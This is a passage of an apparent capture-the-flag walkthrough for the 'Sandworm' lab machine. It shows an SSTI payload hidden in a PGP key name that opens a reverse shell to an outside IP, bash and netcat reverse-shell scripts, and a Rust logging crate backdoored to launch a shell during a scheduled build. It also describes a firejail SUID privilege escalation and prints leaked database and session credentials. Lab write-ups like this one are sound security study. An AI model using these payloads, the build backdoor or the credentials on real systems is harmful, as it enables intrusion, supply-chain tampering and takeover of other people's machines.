from . import db from flask_login import UserMixin class User(db.Model, UserMixin): __tablename__ = 'users' id = db.Column(db.Integer, primary_key=True) password = db.Column(db.String(100)) username = db.Column(db.String(1000))
```

And lastly checking the /var/www/html/SSA/SSA/\_\_init\_\_.py shows us first juicy informations:

```Python
from flask import Flask from flask_login import LoginManager from flask_sqlalchemy import SQLAlchemy db = SQLAlchemy() def create_app(): app = Flask(__name__) app.config['SECRET_KEY'] = '91668c1bc67132e3dcfb5b1a3e0c5c21' app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA' db.init_app(app) # blueprint for non-auth parts of app from .app import main as main_blueprint app.register_blueprint(main_blueprint) login_manager = LoginManager() login_manager.login_view = "main.login" login_manager.init_app(app) from .models import User @login_manager.user_loader def load_user(user_id): return User.query.get(int(user_id)) return app
```

But seems like it's not working anyway..

After many(too many) attempt I finally made it working, basically I used Gnome keyring(gpg wallet GUI) to create the PGP key with name with the Rev shell in it! All I did now was working but the gpg on terminal had some limitations in >< symbols where the Keyring didn't:

![11eed78102d5a453965b94e29a7601a9.png](../../../_resources/11eed78102d5a453965b94e29a7601a9.png)

Then exported the public and private key:

![2933425c46a39864ad19c3185daf3e48.png](../../../_resources/2933425c46a39864ad19c3185daf3e48.png)

![35dd5e6c996fb947c37ebc7741510e08.png](../../../_resources/35dd5e6c996fb947c37ebc7741510e08.png)

Imported back in GPG:

```Bash
┌──(root㉿kali-linux)-[/home/millycash/Downloads]
└─# gpg --list-secret-keys                    
/root/.gnupg/pubring.kbx
------------------------
sec   rsa4096 2023-06-18 [SC]
      74990A753231BF2198058583BB105CB776D3F657
uid           [ unknown] {{ namespace.__init__.__globals__.os.popen('bash -c "/bin/sh -i >& /dev/tcp/10.10.16.3/6666 0>&1"').read() }}
ssb   rsa4096 2023-06-18 [E]


┌──(root㉿kali-linux)-[/home/millycash/Downloads]
└─# gpg --list-key        
/root/.gnupg/pubring.kbx
------------------------
pub   rsa4096 2023-05-04 [SC]
      D6BA9423021A0839CCC6F3C8C61D429110B625D4
uid           [ unknown] SSA (Official PGP Key of the Secret Spy Agency.) <atlas@ssa.htb>
sub   rsa4096 2023-05-04 [E]

pub   rsa4096 2023-06-18 [SC]
      74990A753231BF2198058583BB105CB776D3F657
uid           [ unknown] {{ namespace.__init__.__globals__.os.popen('bash -c "/bin/sh -i >& /dev/tcp/10.10.16.3/6666 0>&1"').read() }}
sub   rsa4096 2023-06-18 [E]
```

And lastly signing a message with my public key:

```Bash
┌──(root㉿kali-linux)-[/home/millycash/Downloads]
└─# gpg --sign --armor -r 74990A753231BF2198058583BB105CB776D3F657 test.txt
gpg: WARNING: recipients (-r) given without using public key encryption
                                                                                                                                                              
┌──(root㉿kali-linux)-[/home/millycash/Downloads]
└─# cat test.txt.asc 
-----BEGIN PGP MESSAGE-----

owEBXAKj/ZANAwAKAbsQXLd20/ZXAawVYgh0ZXN0LnR4dGSPZfd3aG9hbWkKiQIz
BAABCgAdFiEEdJkKdTIxvyGYBYWDuxBct3bT9lcFAmSPZfcACgkQuxBct3bT9le9
oxAAgw6EVE3d7nSlvtvbQgnaY+w4cRASc+0ME7ygqBhB5DOIgfmjwHraKooqw/FP
9Cu9EEJ4qvhBweHOxMGHAyfWOMqGoRcjdok+EgzFmYjl9KuQNUXwM+0h1S8AF1Or
lJb4HVkOHy9BdBSfluNk5bB4e5AqnF4DFIy00w1+Ugv5EZvg4p/vLO2Io25KYIxw
K2+VRYdXXCclDPfIhVjIGmodWT0YpdY0TRqXNjT7cA5FRaI/H4xRl4Uttg75StR4
n075v1LAZL0NYmC7h8vnL3vX3V/ffYPIIZ/mythpnTv6fi7lZoiDXxbKJGBt5lhy
TMPGX3MPfL1aMBDWSUKq6jF76PoxnzvtxssvPGuvqL3s92LSGmoxnCiuwb1abwUt
XO2Hxzbl/cWAd1lxWnlT6Hm0hzkjKO3IdlGuN7b5ssOlklK94ZqmBisR4rRH9HHy
aQJENfk+08h/BWh2267CkJg32Zcnsxnpj7o2YjUL6YeEzTM74Vx0c8+WOe5tw06b
jM3dyYrJv3h0/BnpaDk/CoBWydSwRNYT86DMDze0k4+Z1QAm1A51T3/jht7wvVyV
ozpQmBxo7dasJKbfuOWvH8XUvwiTbDpjLOXv/5LfG/pLfeCtt+UtCOnsK1tjt1qP
Lo6rxDIsG2Dcl0e1lquWiJ55MgYXqZ9R6k/ud7KnijLj8X0=
=Ludp
-----END PGP MESSAGE-----
```

And lastly sending our Pub key and the signed message:

![8ef2e07829da01874de1cd47a0035b6f.png](../../../_resources/8ef2e07829da01874de1cd47a0035b6f.png)

We have a Shell senor:
![791e43c8c55ba1bf4a837b69d7245c49.png](../../../_resources/791e43c8c55ba1bf4a837b69d7245c49.png)

* * *

## Road to Local.txt

Going into atlas home seems like we can't do that much cause user.txt is not there and .ssh is void so we have to find the other username first:
silentobserver
Seems like we have very limited amout of command available and curl/wget is not available so I will get back and enumerate manually this environment.
Going back on html this seems interesting:
![310e0dc17eb27e83fd8db715374b9323.png](../../../_resources/310e0dc17eb27e83fd8db715374b9323.png)
Another:
![6c2fff488427e5263ab8988da4737e7a.png](../../../_resources/6c2fff488427e5263ab8988da4737e7a.png)
Then lookin arounf for files, that hidden .cofnig files seems interesting. And eventually yes I unveil the password for the first username:

```Bash
tlas@sandworm:~/.config$ ll
ll
total 12
drwxrwxr-x 4 atlas  atlas   4096 Jan 15 07:48 ./
drwxr-xr-x 8 atlas  atlas   4096 Jun  7 13:44 ../
dr-------- 2 nobody nogroup   40 Jun 18 18:37 firejail/
drwxrwxr-x 3 nobody atlas   4096 Jan 15 07:48 httpie/
atlas@sandworm:~/.config$ cd h	
cd httpie/
atlas@sandworm:~/.config/httpie$ ll
ll
total 12
drwxrwxr-x 3 nobody atlas 4096 Jan 15 07:48 ./
drwxrwxr-x 4 atlas  atlas 4096 Jan 15 07:48 ../
drwxrwxr-x 3 nobody atlas 4096 Jan 15 07:48 sessions/
atlas@sandworm:~/.config/httpie$ cd se	
cd sessions/
atlas@sandworm:~/.config/httpie/sessions$ ll
ll
total 12
drwxrwxr-x 3 nobody atlas 4096 Jan 15 07:48 ./
drwxrwxr-x 3 nobody atlas 4096 Jan 15 07:48 ../
drwxrwx--- 2 nobody atlas 4096 May  4 17:30 localhost_5000/
atlas@sandworm:~/.config/httpie/sessions$ cd lo	
cd localhost_5000/
atlas@sandworm:~/.config/httpie/sessions/localhost_5000$ ll
ll
total 12
drwxrwx--- 2 nobody atlas 4096 May  4 17:30 ./
drwxrwxr-x 3 nobody atlas 4096 Jan 15 07:48 ../
-rw-r--r-- 1 nobody atlas  611 May  4 17:26 admin.json
atlas@sandworm:~/.config/httpie/sessions/localhost_5000$ ll
ll
total 12
drwxrwx--- 2 nobody atlas 4096 May  4 17:30 ./
drwxrwxr-x 3 nobody atlas 4096 Jan 15 07:48 ../
-rw-r--r-- 1 nobody atlas  611 May  4 17:26 admin.json
atlas@sandworm:~/.config/httpie/sessions/localhost_5000$ cat ad	
cat admin.json 
{
    "__meta__": {
        "about": "HTTPie session file",
        "help": "https://httpie.io/docs#sessions",
        "httpie": "2.6.0"
    },
    "auth": {
        "password": "quietLiketheWind22",
        "type": null,
        "username": "silentobserver"
    },
    "cookies": {
        "session": {
            "expires": null,
            "path": "/",
            "secure": false,
            "value": "eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA"
        }
    },
    "headers": {
        "Accept": "application/json, */*;q=0.5"
    }
}
```

Now let's ssh and obtain our first flag!

## ![d0cdfb3c4dc6a5b601b0fc42223a7989.png](../../../_resources/d0cdfb3c4dc6a5b601b0fc42223a7989.png)

* * *

## Road to Root.txt:

Now that we have a proper username with a real bash we can see what can we do here!

I will upload a Linpeas copy and check what I can do from there. I will post only the relevant stuff:

```Bash
OS: Linux version 5.15.0-73-generic (buildd@bos03-amd64-060) (gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #80-Ubuntu SMP Mon May 15 15:18:26 UTC 2023
User & Groups: uid=1001(silentobserver) gid=1001(silentobserver) groups=1001(silentobserver)
Hostname: sandworm
Writable folder: /dev/shm

╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/home/silentobserver/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin


╔══════════╣ Hostname, hosts and DNS
sandworm
127.0.0.1 localhost sandworm ssa.htb
127.0.1.1 sandworm ssa.htb

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0 trust-ad
search .


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -            

drwxrwxr-x 6 atlas silentobserver 4096 May  4 17:08 /opt/crates/logger/.git
drwxr-xr-- 6 root atlas 4096 Jun  6 11:49 /opt/tipnet/.git

-rw-r--r-- 1 root root 713 Nov 29  2022 /usr/local/etc/firejail/1password.profile
-rw-r--r-- 1 root root 1265 Nov 29  2022 /usr/local/etc/firejail/gnome-passwordsafe.profile

╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwsrwxr-x 2 atlas atlas 57M Jun  6 10:00 /opt/tipnet/target/debug/tipnet (Unknown SUID binary!)
-rwsrwxr-x 1 atlas atlas 54M May  4 18:06 /opt/tipnet/target/debug/deps/tipnet-a859bd054535b3c1 (Unknown SUID binary!)
-rwsrwxr-x 2 atlas atlas 57M Jun  6 10:00 /opt/tipnet/target/debug/deps/tipnet-dabc93f7704f7b48 (Unknown SUID binary!)
-rwsr-x--- 1 root jailer 1.7M Nov 29  2022 /usr/local/bin/firejail (Unknown SUID binary!)



╔══════════╣ Unexpected in /opt (usually empty)
total 16
drwxr-xr-x  4 root root  4096 Jun 18 20:58 .
drwxr-xr-x 19 root root  4096 Jun  7 13:53 ..
drwxr-xr-x  3 root atlas 4096 May  4 17:26 crates
drwxr-xr-x  5 root atlas 4096 Jun  6 11:49 tipnet
```

After a examination the only thing that seems plausible to me is that firejail SUID file:

![54888ff6d745138bd7ec705f7294cca2.png](../../../_resources/54888ff6d745138bd7ec705f7294cca2.png)

And checking on web there are several known CVE but we have to find the version of it first.

Edit: the version running is 0.9.72 which is the last one and no known exploits are out in the wild!
Apparently after asking around the solutions is checking the running processes with Pspy ex and those processes:

```Bash
2023/06/20 08:18:01 CMD: UID=0     PID=1518   | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
2023/06/20 08:18:01 CMD: UID=0     PID=1519   | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
2023/06/20 08:18:01 CMD: UID=0     PID=1520   | /bin/sudo -u atlas /usr/bin/cargo run --offline
2023/06/20 08:18:01 CMD: UID=1000  PID=1521   |
2023/06/20 08:18:01 CMD: UID=1000  PID=1522   | rustc -vV
2023/06/20 08:18:01 CMD: UID=1000  PID=1523   | /usr/bin/cargo run --offline
2023/06/20 08:18:01 CMD: UID=1000  PID=1525   | /usr/bin/cargo run --offline
2023/06/20 08:18:01 CMD: UID=1000  PID=1527   | rustc -vV
2023/06/20 08:18:11 CMD: UID=0     PID=1531   | /bin/bash /root/Cleanup/clean_c.sh
```

What is usefull here is those folders under /opt/tipnet that are builded via cargo, basically the idea here is to add a Rust command to invoke a bash script as "Atlas" user and escape the Firejail since we know from our first RCE we were Atlas with a very mimited shell aka "Firejail".

Checking all the files under /opt seems like we can edit the fiile:

```Bash
silentobserver@sandworm:/opt/crates/logger/src$ ll
total 12
drwxrwxr-x 2 atlas silentobserver 4096 May  4 17:12 ./
drwxr-xr-x 5 atlas silentobserver 4096 May  4 17:08 ../
-rw-rw-r-- 1 atlas silentobserver  732 May  4 17:12 lib.rs
silentobserver@sandworm:/opt/crates/logger/src$
```

First we add a simple bash shell somewhere:

```Bash
silentobserver@sandworm:/tmp$ cat shell.sh
#!/bin/bash
/bin/bash -i >& /dev/tcp/ 10.10.16.2/5555 0>&1
silentobserver@sandworm:/tmp$
```

Then we save the lib.rs code and add the into the logger function the code to execute a shell command. The logger function need to be kept otherwise the cargo build will fail, most likely is cause that function is used in the /opt/tipper.

I got inspiration for Command execution via Rust from here: https://stackoverflow.com/questions/71540607/how-can-i-run-a-shell-script-file-sh-in-rust

And putting eveithing together should look like something similar:

```Rust
extern crate chrono;

use std::process::Command;
use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;

pub fn log(user: &str, query: &str, justification: &str) {
    Command::new("sh")
        .arg("-C")
        .arg("/tmp/shell.sh")
        .spawn()
        .expect("sh command failed to start");
    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }
}
```

Now we need to be fast cause the cron job is deleting /opt which mean we have to empty that lib.rs, add our code, cargo compile as -atlas and lastly it should spawn a shell in our NC listener as Atlas user but with full shell(aka outside Firejail).

```Bash
extern crate chrono;

use std::process::Command;
use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;

pub fn log(user: &str, query: &str, justification: &str) {
    Command::new("bash")
        .arg("-C")
        .arg("/tmp/shell.sh")
        .spawn()
        .expect("sh command failed to start");
    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }
}
```

And after a while we should be able to get a shell as Atlas outside Firejail:
![9660dde9904df3c12b3198922efc706c.png](../../../_resources/9660dde9904df3c12b3198922efc706c.png)

Now we have to find a way how to escalate from Atlas to Root! I will upload again linpeas and check what juicy info can we get this time as atlas!

```Bash
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
You own the SUID file: /opt/tipnet/target/debug/tipnet
You own the SUID file: /opt/tipnet/target/debug/deps/tipnet-a859bd054535b3c1
You own the SUID file: /opt/tipnet/target/debug/deps/tipnet-dabc93f7704f7b48
-rwsr-x--- 1 root jailer 1.7M Nov 29  2022 /usr/local/bin/firejail (Unknown SUID binary!)
-rwsr-xr-- 1 root messagebus 35K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper

/opt/tipnet/target/debug/build/ahash-7a6cfda19533727e/output
/opt/tipnet/target/debug/build/ahash-7a6cfda19533727e/root-output
/opt/tipnet/target/debug/build/ahash-7a6cfda19533727e/stderr
```

Umh wondering if those binaried under /opt/tipnet are the way in but I will invoke a Pspy as Atlas and check for recurrent processes!

```Bash
0 09:22:28 CMD: UID=0     PID=1      | /sbin/init maybe-ubiquity
2023/06/20 09:24:01 CMD: UID=0     PID=26145  | /usr/sbin/CRON -f -P
2023/06/20 09:24:01 CMD: UID=0     PID=26144  | /usr/sbin/CRON -f -P
2023/06/20 09:24:01 CMD: UID=0     PID=26146  | /usr/sbin/CRON -f -P
2023/06/20 09:24:01 CMD: UID=0     PID=26147  | sleep 10
2023/06/20 09:24:01 CMD: UID=0     PID=26150  | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
2023/06/20 09:24:01 CMD: UID=???   PID=26149  | ???
2023/06/20 09:24:01 CMD: UID=0     PID=26148  | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
2023/06/20 09:24:01 CMD: UID=1000  PID=26151  | /usr/bin/cargo run --offline
2023/06/20 09:24:01 CMD: UID=1000  PID=26152  | rustc -vV
2023/06/20 09:24:01 CMD: UID=1000  PID=26153  | /usr/bin/cargo run --offline
2023/06/20 09:24:01 CMD: UID=1000  PID=26155  | rustc - --crate-name ___ --print=file-names --crate-type bin --crate-type rlib --crate-type dylib --crate-type cdylib --crate-type staticlib --crate-type proc-macro --print=sysroot --print=cfg
2023/06/20 09:24:01 CMD: UID=1000  PID=26157  | rustc -vV
2023/06/20 09:24:02 CMD: UID=1000  PID=26161  | bash -C /tmp/shell.sh
2023/06/20 09:24:02 CMD: UID=1000  PID=26162  | bash -C /tmp/shell.sh
2023/06/20 09:24:02 CMD: UID=1000  PID=26163  | mkfifo /tmp/f
2023/06/20 09:24:02 CMD: UID=1000  PID=26166  | bash -C /tmp/shell.sh
2023/06/20 09:24:02 CMD: UID=1000  PID=26165  | bash -C /tmp/shell.sh
2023/06/20 09:24:02 CMD: UID=1000  PID=26164  | cat /tmp/f
2023/06/20 09:24:02 CMD: UID=???   PID=26171  | ???
2023/06/20 09:24:02 CMD: UID=1000  PID=26170  |
2023/06/20 09:24:02 CMD: UID=1000  PID=26168  | /bin/sh /usr/bin/lesspipe
2023/06/20 09:24:02 CMD: UID=1000  PID=26172  | /bin/bash -i
2023/06/20 09:24:11 CMD: UID=0     PID=26173  | /bin/bash /root/Cleanup/clean_c.sh
2023/06/20 09:24:11 CMD: UID=0     PID=26174  | /bin/rm -r /opt/crates
2023/06/20 09:24:11 CMD: UID=0     PID=26175  |
2023/06/20 09:24:11 CMD: UID=0     PID=26176  | /bin/bash /root/Cleanup/clean_c.sh
2023/06/20 09:24:11 CMD: UID=0     PID=26177  |
2023/06/20 09:25:01 CMD: UID=0     PID=26180  | /usr/sbin/CRON -f -P
2023/06/20 09:25:01 CMD: UID=0     PID=26181  | /usr/sbin/CRON -f -P
2023/06/20 09:25:01 CMD: UID=0     PID=26182  | /bin/bash /root/Cleanup/clean.sh
2023/06/20 09:25:01 CMD: UID=0     PID=26183  | /bin/cp -p /root/Cleanup/webapp.profile /home/atlas/.config/firejail/
2023/06/20 09:25:01 CMD: UID=0     PID=26184  | /bin/bash /root/Cleanup/clean.sh
```

Then somethingstuck in my mind:

```Bash
2023/06/20 09:58:11 CMD: UID=0     PID=27542  |
2023/06/20 09:58:11 CMD: UID=0     PID=27543  | /bin/cp -rp /root/Cleanup/crates /opt/
2023/06/20 09:58:11 CMD: UID=0     PID=27544  | /usr/bin/chmod u+s /opt/tipnet/target/debug/tipnet
```

Root user chmod adding user and suid permission on /opt/tipnet/target/debug/tipnet. What if write something there?

# I GAVE UP THIS CRAP!

Edit: the day after I checked for tips and apparently I was very near the solution..

Basically first time I tried to exploit those firejail I found with linpeas that had SUID permissions:

```Bash
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwsr-x--- 1 root jailer 1.7M Nov 29  2022 /usr/local/bin/firejail (Unknown SUID binary!)
```

And googling around I stumbled upon this exploit in github:

https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25

But when I tried to run it from Silentobserver user it didn't worked cause it had to be either root user or jailer group. 

But here checking again which groups is Atlas part of:

```Bash
atlas@sandworm:/opt/tipnet$ id
id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas),1002(jailer)
```

Yeah it's part of Jailer which means we should be able to escape Atlas to Root because we are part of that group. So uploading that Python script and running it:

```Bash
atlas@sandworm:/tmp$ ll
ll
total 60
drwxrwxrwt 12 root           root           4096 Jun 21 07:16 ./
drwxr-xr-x 19 root           root           4096 Jun  7 13:53 ../
prw-rw-r--  1 atlas          atlas             0 Jun 21 07:16 f|
-rwxrwxr-x  1 atlas          atlas          7954 Jun 21 07:15 firejail_suid.py*
drwxrwxrwt  2 root           root           4096 Jun 21 06:45 .font-unix/
drwxrwxrwt  2 root           root           4096 Jun 21 06:45 .ICE-unix/
-rwxrwxr-x  1 silentobserver silentobserver   92 Jun 21 06:59 shell.sh*
drwx------  3 root           root           4096 Jun 21 06:45 systemd-private-d379b7c2ddb744ea9a1ef57c0819d8e6-ModemManager.service-gCfPHS/
drwx------  3 root           root           4096 Jun 21 06:45 systemd-private-d379b7c2ddb744ea9a1ef57c0819d8e6-systemd-logind.service-MeKKch/
drwx------  3 root           root           4096 Jun 21 06:45 systemd-private-d379b7c2ddb744ea9a1ef57c0819d8e6-systemd-resolved.service-sCLPgk/
drwx------  3 root           root           4096 Jun 21 06:45 systemd-private-d379b7c2ddb744ea9a1ef57c0819d8e6-systemd-timesyncd.service-myfiJv/
drwxrwxrwt  2 root           root           4096 Jun 21 06:45 .Test-unix/
drwx------  2 root           root           4096 Jun 21 06:45 vmware-root_816-2965579223/
drwxrwxrwt  2 root           root           4096 Jun 21 06:45 .X11-unix/
drwxrwxrwt  2 root           root           4096 Jun 21 06:45 .XIM-unix/
```

```Bash
atlas@sandworm:/tmp$ python3 ./firejail_suid.py
python3 ./firejail_suid.py
You can now run 'firejail --join=2786' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```

Then edit the shell.sh script and spawn another RCE as atlas and escape baby!

```Bash
//Edit the shell.sh
silentobserver@sandworm:/tmp$ cat shell.sh
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.2 6666 >/tmp/f
silentobserver@sandworm:/tmp$

//Do the same thing to escape the Firejail as Atlas

//Check in the new NC listener
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads]
└─# nc -lvnp 6666
listening on [any] 6666 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.218] 53918
bash: cannot set terminal process group (2959): Inappropriate ioctl for device
bash: no job control in this shell
atlas@sandworm:/opt/tipnet$
```

Profit!

```Bash
atlas@sandworm:/tmp$ id
id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas),1002(jailer)
atlas@sandworm:/tmp$

atlas@sandworm:/tmp$ firejail --join=2786
firejail --join=2786
Warning: cleaning all supplementary groups
changing root to /proc/2786/root
Child process initialized in 9.33 ms
whoami
atlas

sudo su -
atlas is not in the sudoers file.  This incident will be reported.
su -
id
uid=0(root) gid=0(root) groups=0(root)

cd /root
ls
Cleanup
domain.crt
domain.csr
domain.key
root.txt

cat root.txt
```

* * *